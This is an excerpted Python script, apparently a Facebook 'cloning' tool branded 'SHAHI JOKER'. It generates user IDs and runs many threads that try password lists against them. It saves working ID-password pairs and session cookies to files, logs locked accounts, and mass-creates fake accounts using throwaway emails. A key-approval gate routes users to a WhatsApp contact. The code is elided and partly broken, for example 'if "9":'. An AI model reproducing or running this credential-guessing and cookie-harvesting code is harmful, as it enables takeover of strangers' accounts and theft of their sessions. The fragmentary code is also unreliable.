...
def menu():
            clear()
        #    linex()
            print('   \33[37;42m\t Welcome DOD xd 𝐒𝐇𝐀𝐇𝐈🦉𝐉𝐎𝐊𝐄𝐑 Tool\33[0;m');linex()
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as 𝐒𝐇𝐀𝐇𝐈🦉𝐉𝐎𝐊𝐄𝐑:     
                        clear()
                        ...
                        for psx in user:
                                ...
                                𝐒𝐇𝐀𝐇𝐈🦉𝐉𝐎𝐊𝐄𝐑.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def api1(ids,names,passlist):
        try:
            global ok,loop
            sys.stdout.write('\r\r\033[1;37m [𝐒𝐇𝐀𝐇𝐈🦉𝐉𝐎𝐊𝐄𝐑-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                if 'session_key' in q:
                    ...
                    open('/sdcard/DOD/𝐒𝐇𝐀𝐇𝐈🦉𝐉𝐎𝐊𝐄𝐑-OK.txt','a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;205m [𝐒𝐇𝐀𝐇𝐈🦉𝐉𝐎𝐊𝐄𝐑-CP] '+ids+' | '+pas+'\033[1;97m')
                        open('/sdcard/DOD/𝐒𝐇𝐀𝐇𝐈🦉𝐉𝐎𝐊𝐄𝐑-CP.txt','a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
                    else:
                        open('/sdcard/DOD/𝐒𝐇𝐀𝐇𝐈🦉𝐉𝐎𝐊𝐄𝐑-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [𝐒𝐇𝐀𝐇𝐈🦉𝐉𝐎𝐊𝐄𝐑-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/DOD/𝐒𝐇𝐀𝐇𝐈🦉𝐉𝐎𝐊𝐄𝐑-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/DOD/𝐒𝐇𝐀𝐇𝐈🦉𝐉𝐎𝐊𝐄𝐑-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [𝐒𝐇𝐀𝐇𝐈🦉𝐉𝐎𝐊𝐄𝐑-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'your account was locked' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        open('/sdcard/DOD/𝐒𝐇𝐀𝐇𝐈🦉𝐉𝐎𝐊𝐄𝐑-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def Create():
    ...
    def strt():
       try:
           ...
           import sys
           loop+=1
           sys.stdout.write(f'\r\r\033[1;37m [𝐒𝐇𝐀𝐇𝐈🦉𝐉𝐎𝐊𝐄𝐑-CREATE] OK:%s \033[1;37m'%(ok));sys.stdout.flush()
           requests=r.Session()
           from fake_email import Email
           mmail=Email().Mail()
           em=mmail['mail']
           ...
           if "9":
              ...
              if requests=="chk":
                ...
                pass
                 ...
                 print("\r\r\033[1;32m [𝐒𝐇𝐀𝐇𝐈🦉𝐉𝐎𝐊𝐄𝐑-OK] "+uid+'|'+pas+'|'+coki)
                 linex()
                 ok+=1
...
def main_apv():
    ...
    print(logo)
    try:
        key1 = open('/sdcard/.𝐒𝐇𝐀𝐇𝐈🦉𝐉𝐎𝐊𝐄𝐑.key.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
        ...
        kok = open('/sdcard/.𝐒𝐇𝐀𝐇𝐈🦉𝐉𝐎𝐊𝐄𝐑.key.txt', 'w')
        kok.write(myid + imt)
        kok.close()
    
        input(' Exit And Again Run The Command');os.system('python mrKing.py')
        tks = ('Hello%20𝐒𝐇𝐀𝐇𝐈🦉𝐉𝐎𝐊𝐄𝐑%20Owner%20Kashif%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+?text='+tks)
    ...
    if key1 in r1:
        ...
        tks = ('Hello%20DOD%20Owner%20𝐒𝐇𝐀𝐇𝐈🦉𝐉𝐎𝐊𝐄𝐑-XD%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+93707266012?text='+tks)
        main_apv()
main_apv()
